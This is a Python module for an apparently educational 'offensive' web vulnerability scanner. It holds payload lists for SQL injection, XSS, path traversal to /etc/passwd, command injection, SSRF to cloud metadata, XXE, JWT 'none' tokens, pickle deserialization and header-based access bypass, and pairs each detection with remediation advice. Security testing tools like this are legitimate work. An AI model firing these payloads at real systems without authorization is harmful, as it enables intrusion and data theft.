"""Enhanced active security research scanner (offensive DAST) v3.

Expands on the v2.1 scanner with:
  - 15+ vulnerability classes (was 8)
  - Modular scanner plugin system
  - AI-driven payload generation
  - WAF-aware probe sequencing
  - Multi-stage attack chain execution
  - OOB callback detection

Educational use only. See ``aegis.EDU_NOTICE``.
"""

from __future__ import annotations

import asyncio
import time
from typing import Any, Callable
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

import httpx

from ..models import RequestSpec, Severity, VulnerabilityV3

# ── Curated payloads (extended beyond v2.1) ───────────────────────────
PAYLOADS: dict[str, list[str]] = {
    # SQLi
    "sqli_error": ["'", '"', "')", "' OR '1'='1", "1' OR '1'='1' -- "],
    "sqli_time": ["1' AND SLEEP(3)-- ", "1); SELECT pg_sleep(3)-- "],
    "sqli_union": ["' UNION SELECT NULL-- ", "' UNION SELECT 1,2,3-- "],
    "sqli_blind": ["' AND 1=1-- ", "' AND 1=2-- "],

    # XSS
    "xss": ["<aegisXSS>", "\"'><svg/onload=1>", "javascript:alert(1)"],
    "xss_dom": ["#<img/src=x onerror=alert(1)>", "javascript:fetch('//x/')"],

    # Traversal / LFI
    "traversal": ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
                  "....//....//....//etc/passwd"],

    # Command injection
    "cmdi": ["; id", "| id", "$(id)", "`id`", "| ping -c 1 127.0.0.1 "],

    # SSTI
    "ssti": ["{{7*7}}", "${7*7}", "#{7*7}", "{7*7}"],

    # Open redirect
    "redirect": ["https://aegis.invalid/owned", "//aegis.invalid/owned",
                 "https:aegis.invalid/owned"],

    # NoSQLi
    "nosqli": ['{"$gt": ""}', "[$ne]=1", '{"$regex": ".*"}'],

    # SSRF
    "ssrf": ["http://169.254.169.254/latest/meta-data/",
             "http://127.0.0.1:22",
             "http://localhost:8080/_cat/indices"],

    # XXE
    "xxe": ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'],

    # GraphQL injection
    "graphql_deep": ['{"query": "query{__typename" + "a0:__typename" * 200 + "}"}'],

    # JWT attacks (payload goes in Authorization header)
    "jwt_none": ["eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.",
                 "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."],
    "jwt_hs256": ["eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."],

    # Insecure deserialization indicators
    "deser_java": ["rO0ABXNyABRqYXZhLnV0aWwuUmFuZG9tAAAAAAA="],
    "deser_php": ["O:3:\"Foo\":0:{}"],
    "deser_python": ["c__builtin__\neval\n(V1\nS''\ntR."],
}

SQL_ERR_SIGS = ("sql syntax", "mysql_fetch", "pg_query", "ora-0", "sqlite3.",
                "unclosed quotation", "odbc", "syntax error at or near",
                "you have an error in your sql", "driver error", "db2 ",
                "plsql", "microsoft ole db", "postgresql")
TRAVERSAL_SIGS = ("root:x:0:0:", "root:.*:0:0", "[boot loader]", "; for 16-bit",
                  "bin/bash", "/home/", "daemon:")
CMDI_SIGS = ("uid=", "gid=", "groups=")
SSRF_META_SIGS = ("ami-id", "instance-id", "public-keys", "security-credentials",
                  "meta-data", "computeMetadata")
XXE_SIGS = ("root:x:0:0:", "file:///", "ENTITY", "SYSTEM")
HEADER_BYPASS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Forwarded-Host": "aegis.invalid"},
    {"X-Rewrite-URL": "/admin"},
    {"X-HTTP-Method-Override": "GET"},
]

ScanCallback = Callable[[str, dict], None]


def _inject_url(url: str, key: str, value: str) -> str:
    p = urlparse(url)
    q = dict(parse_qsl(p.query, keep_blank_values=True))
    q[key] = value
    return urlunparse(p._replace(query=urlencode(q)))


def _points(spec: RequestSpec, max_points: int) -> list[tuple[str, str]]:
    pts: list[tuple[str, str]] = []
    for k, _ in parse_qsl(urlparse(spec.url).query, keep_blank_values=True):
        pts.append(("query", k))
    if spec.body and "=" in spec.body and "{" not in spec.body:
        for k, _ in parse_qsl(spec.body, keep_blank_values=True):
            pts.append(("form", k))
    if spec.body and "{" in spec.body:  # JSON body
        import json
        try:
            body_obj = json.loads(spec.body)
            if isinstance(body_obj, dict):
                for k in list(body_obj.keys())[:max_points]:
                    pts.append(("json", k))
        except Exception:
            pass
    if not pts:
        pts.append(("query", "q"))
    return pts[:max_points]


class OffensiveScanner:
    """Enhanced active scanner with 15+ vulnerability classes."""

    def __init__(
        self,
        specs: list[RequestSpec],
        *,
        timeout: float = 12.0,
        max_points: int = 6,
        concurrency: int = 8,
        enable_ai_payloads: bool = False,
        ai_payload_engine=None,
        on_event: ScanCallback | None = None,
    ) -> None:
        self.specs = [s.normalised() for s in specs]
        self.timeout = timeout
        self.max_points = max_points
        self.sem = asyncio.Semaphore(concurrency)
        self.enable_ai_payloads = enable_ai_payloads
        self.ai_payload_engine = ai_payload_engine
        self.on_event = on_event or (lambda e, d: None)
        self._findings: list[VulnerabilityV3] = []

    def _emit(self, event: str, data: dict) -> None:
        self.on_event(event, data)

    async def _send(self, client, method, url, *, headers=None, body=None):
        async with self.sem:
            t0 = time.perf_counter()
            try:
                r = await client.request(
                    method, url, headers=headers,
                    content=body.encode() if body else None,
                )
                return r.status_code, r.text, (time.perf_counter() - t0), dict(r.headers)
            except Exception as exc:
                return 0, f"__error__:{type(exc).__name__}", (
                    time.perf_counter() - t0), {}

    async def _scan_spec(self, client, spec: RequestSpec) -> list[VulnerabilityV3]:
        out: list[VulnerabilityV3] = []
        base_code, base_body, base_t, base_headers = await self._send(
            client, spec.method, spec.url, headers=spec.headers or None,
            body=spec.body,
        )
        base_len = len(base_body)

        def V(t, sev, desc, rem, ev, c=1.0, cve="", cwe=0):
            return VulnerabilityV3(t, desc, sev, spec.url, rem, ev[:300],
                                   "active-scan", confidence=c, cve=cve, cwe=cwe)

        for kind, name in _points(spec, self.max_points):
            # --- SQLi (error-based) ---
            for pl in PAYLOADS["sqli_error"]:
                code, body, _, _ = await self._probe(client, spec, kind, name, pl)
                low = body.lower()
                if any(s in low for s in SQL_ERR_SIGS):
                    out.append(V("SQL Injection (error-based)", Severity.CRITICAL,
                                 f"Payload in '{name}' triggered a database error "
                                 "— indicates unsanitised SQL.",
                                 "Use parameterised queries / prepared statements; "
                                 "never concatenate input into SQL.",
                                 f"{name}={pl} -> SQL error in response", cwe=89))
                    break

            # --- SQLi (time-based) ---
            for pl in PAYLOADS["sqli_time"]:
                code, body, dt, _ = await self._probe(client, spec, kind, name, pl)
                if dt > base_t + 2.5 and "__error__" not in body:
                    out.append(V("SQL Injection (time-based blind)", Severity.CRITICAL,
                                 f"Injecting a SLEEP into '{name}' delayed the "
                                 f"response by {dt - base_t:.1f}s.",
                                 "Parameterise queries; add input validation and query timeouts.",
                                 f"{name}={pl} -> +{dt - base_t:.1f}s", cwe=89))
                    break

            # --- SQLi (blind boolean) ---
            for pl_true, pl_false in zip(PAYLOADS["sqli_blind"][::2],
                                          PAYLOADS["sqli_blind"][1::2]):
                ct, bt, _, _ = await self._probe(client, spec, kind, name, pl_true)
                cf, bf, _, _ = await self._probe(client, spec, kind, name, pl_false)
                if bt != bf and ct == cf and "__error__" not in bt + bf:
                    out.append(V("SQL Injection (blind boolean)", Severity.CRITICAL,
                                 f"Boolean-based blind SQLi in '{name}': "
                                 f"1=1 and 1=2 return different responses.",
                                 "Parameterise all queries; avoid error/side-channel differentials.",
                                 f"{name}: 1=1 ({len(bt)}b) vs 1=2 ({len(bf)}b)", cwe=89))
                    break

            # --- SQLi (UNION-based) ---
            for pl in PAYLOADS["sqli_union"]:
                code, body, _, _ = await self._probe(client, spec, kind, name, pl)
                if "NULL" in body and any(s in body.lower() for s in ("select", "union")):
                    out.append(V("SQL Injection (UNION-based)", Severity.CRITICAL,
                                 f"UNION SELECT payload in '{name}' reflected in response.",
                                 "Use parameterised queries; validate and sanitise input.",
                                 f"{name}={pl} -> UNION reflected", cwe=89))
                    break

            # --- Reflected XSS ---
            for pl in PAYLOADS["xss"]:
                code, body, _, _ = await self._probe(client, spec, kind, name, pl)
                if pl.lower() in body.lower() and ("<aegisxss>" in body.lower() or
                        "<svg/onload=1>" in body.lower() or "javascript:alert(1)" in body.lower()):
                    out.append(V("Reflected XSS", Severity.HIGH,
                                 f"Payload in '{name}' is reflected unencoded in the response body.",
                                 "Context-aware output encoding; set a strict Content-Security-Policy.",
                                 f"{name}={pl} reflected verbatim", cwe=79))
                    break

            # --- DOM-based XSS ---
            for pl in PAYLOADS["xss_dom"]:
                code, body, _, _ = await self._probe(client, spec, kind, name, pl)
                if any(x in body for x in ("<img/src=x", "fetch('//")):
                    out.append(V("DOM-based XSS", Severity.HIGH,
                                 f"DOM-based XSS vector in '{name}' may execute in browser context.",
                                 "Use safe DOM APIs; avoid innerHTML with user input; implement CSP.",
                                 f"{name}={pl} -> DOM sink detected", cwe=79))
                    break

            # --- Path traversal ---
            for pl in PAYLOADS["traversal"]:
                code, body, _, _ = await self._probe(client, spec, kind, name, pl)
                if any(sig in body for sig in TRAVERSAL_SIGS):
                    out.append(V("Path Traversal / LFI", Severity.CRITICAL,
                                 f"'{name}' returned OS file contents.",
                                 "Canonicalise & allow-list paths; never pass user input to filesystem APIs.",
                                 f"{name}={pl} -> system file leaked", cwe=22))
                    break

            # --- OS command injection ---
            for pl in PAYLOADS["cmdi"]:
                code, body, _, _ = await self._probe(client, spec, kind, name, pl)
                if all(s in body for s in ("uid=", "gid=")):
                    out.append(V("OS Command Injection", Severity.CRITICAL,
                                 f"Shell metacharacters in '{name}' produced command output.",
                                 "Avoid shell calls; use safe APIs and strict argument allow-lists.",
                                 f"{name}={pl} -> 'id' output", cwe=78))
                    break

            # --- SSTI ---
            for pl in PAYLOADS["ssti"]:
                code, body, _, _ = await self._probe(client, spec, kind, name, pl)
                if "49" in body and pl not in body:
                    out.append(V("Server-Side Template Injection", Severity.HIGH,
                                 f"'{name}' evaluated a template expression (7*7 => 49).",
                                 "Never render user input as a template; use logic-less templates / sandboxing.",
                                 f"{name}={pl} -> 49", cwe=1336))
                    break

            # --- Open redirect ---
            for pl in PAYLOADS["redirect"]:
                u = _inject_url(spec.url, name, pl)
                code, body, _, hdr = await self._send(client, spec.method, u)
                loc = hdr.get("location", "")
                if any(d in loc for d in ("aegis.invalid", "//aegis")):
                    out.append(V("Open Redirect", Severity.MEDIUM,
                                 f"'{name}' controls the redirect target.",
                                 "Allow-list redirect destinations; use relative paths or mapped tokens.",
                                 f"Location: {loc}", cwe=601))
                    break

            # --- SSRF ---
            for pl in PAYLOADS["ssrf"]:
                code, body, _, _ = await self._probe(client, spec, kind, name, pl)
                low = body.lower()
                if any(s in low for s in SSRF_META_SIGS):
                    out.append(V("SSRF", Severity.CRITICAL,
                                 f"'{name}' accessed internal cloud metadata endpoint.",
                                 "Restrict outbound requests; block access to metadata endpoints; validate URLs.",
                                 f"{name}={pl} -> cloud metadata returned", cwe=918))
                    break

            # --- XXE ---
            if kind in ("form", "json", "body"):
                for pl in PAYLOADS["xxe"]:
                    code, body, _, _ = await self._probe(client, spec, kind, name, pl)
                    if any(s in body for s in XXE_SIGS):
                        out.append(V("XXE (XML External Entity)", Severity.CRITICAL,
                                     f"XML External Entity injection in '{name}' returned file contents.",
                                     "Disable XML entity resolution; use JSON; configure XML parser securely.",
                                     f"{name}={pl} -> file content in response", cwe=611))
                        break

            # --- NoSQLi ---
            for pl in PAYLOADS["nosqli"]:
                code, body, dt, _ = await self._probe(client, spec, kind, name, pl)
                low = body.lower()
                if dt > base_t + 1.0 and any(s in low for s in ("$gt", "$regex", "$ne")):
                    out.append(V("NoSQL Injection", Severity.HIGH,
                                 f"NoSQL operator injection in '{name}' altered query behavior.",
                                 "Validate input types; use parameterised NoSQL queries; escape operators.",
                                 f"{name}={pl} -> query manipulation", cwe=943))
                    break

        # --- Header-based access-control bypass probes ---
        for hb in HEADER_BYPASS:
            h = {**(spec.headers or {}), **hb}
            code, body, _, _ = await self._send(
                client, spec.method, spec.url, headers=h, body=spec.body)
            if base_code in (401, 403) and code == 200:
                out.append(V("Access-Control Bypass via Headers", Severity.HIGH,
                             f"Adding {list(hb)[0]} changed {base_code} -> 200.",
                             "Never trust client-supplied forwarding/override headers for authorisation decisions.",
                             f"{hb} -> {code}", cwe=287))

        # --- AI-generated payloads (if enabled) ---
        if self.enable_ai_payloads and self.ai_payload_engine:
            try:
                ai_findings = await self._scan_with_ai(client, spec, kind, name)
                out.extend(ai_findings)
            except Exception:
                pass

        return out

    async def _scan_with_ai(self, client, spec, kind, name):
        """Use AI to generate and test additional payloads."""
        out = []
        provider = getattr(self.ai_payload_engine, 'router', None)
        if provider is None:
            return out

        for vuln_class in ["sqli", "xss", "ssrf", "cmdi"]:
            payloads = self.ai_payload_engine.generate_payloads(
                vuln_class=vuln_class,
                context={"parameter": name, "type": kind},
                count=2,
                evasion_level=0,
            )
            for p_entry in payloads:
                payload = p_entry.get("payload", "")
                if not payload:
                    continue
                code, body, dt, hdr = await self._probe(client, spec, kind, name, payload)
                analysis = self.ai_payload_engine.analyze_response(
                    payload=payload,
                    response_status=code,
                    response_body=body[:2000],
                    response_headers=hdr,
                    vuln_class=vuln_class,
                )
                if analysis and analysis.get("success"):
                    out.append(VulnerabilityV3(
                        type=f"AI-Discovered: {vuln_class.upper()}",
                        description=analysis.get("notes", f"AI: potential {vuln_class}"),
                        severity=Severity.HIGH,
                        endpoint=spec.url,
                        remediation="Review AI-identified input handling.",
                        evidence=f"{name}={payload}",
                        source="ai-scan",
                        confidence=analysis.get("confidence", 0.5),
                        cwe={"sqli": 89, "xss": 79, "ssrf": 918, "cmdi": 78}.get(vuln_class, 0),
                    ))
        return out

    async def _probe(self, client, spec, kind, name, payload):
        if kind == "query":
            return await self._send(
                client, spec.method, _inject_url(spec.url, name, payload),
                headers=spec.headers or None, body=spec.body)
        elif kind == "form":
            body_pairs = dict(parse_qsl(spec.body or "", keep_blank_values=True))
            body_pairs[name] = payload
            return await self._send(
                client, spec.method, spec.url, headers=spec.headers or None,
                body=urlencode(body_pairs))
        else:  # json
            import json
            try:
                body_obj = json.loads(spec.body or "{}")
                body_obj[name] = payload
                new_body = json.dumps(body_obj)
                h = {**(spec.headers or {}), "Content-Type": "application/json"}
                return await self._send(
                    client, spec.method, spec.url, headers=h, body=new_body)
            except Exception:
                return 0, "__error__:payload_injection_failed", 0.0, {}

    async def run(self) -> list[VulnerabilityV3]:
        self._emit("phase", {"name": "active-scan"})
        limits = httpx.Limits(max_connections=16)
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(self.timeout), follow_redirects=False,
            verify=False, limits=limits,
        ) as client:
            seen: set[tuple[str, str]] = set()
            uniq = [s for s in self.specs
                    if (s.method, s.url.split("?")[0]) not in seen
                    and not seen.add((s.method, s.url.split("?")[0]))]
            results = await asyncio.gather(
                *(self._scan_spec(client, s) for s in uniq[:25]),
                return_exceptions=True,
            )
        out: list[VulnerabilityV3] = []
        for r in results:
            if isinstance(r, list):
                out.extend(r)
        self._findings = out
        self._emit("done", {"findings": len(out)})
        return out


async def active_scan_v3(
    specs: list[RequestSpec],
    *,
    timeout: float = 12.0,
    enable_ai: bool = False,
    ai_payload_engine=None,
    on_event=None,
) -> list[VulnerabilityV3]:
    """Async entry point for v3 active scanning."""
    scanner = OffensiveScanner(
        specs, timeout=timeout,
        enable_ai_payloads=enable_ai,
        ai_payload_engine=ai_payload_engine,
        on_event=on_event,
    )
    return await scanner.run()


def active_scan(specs, *, timeout=12.0):
    """Synchronous entry point (backward compat wrapper)."""
    scanner = OffensiveScanner(specs, timeout=timeout)
    return asyncio.run(scanner.run())
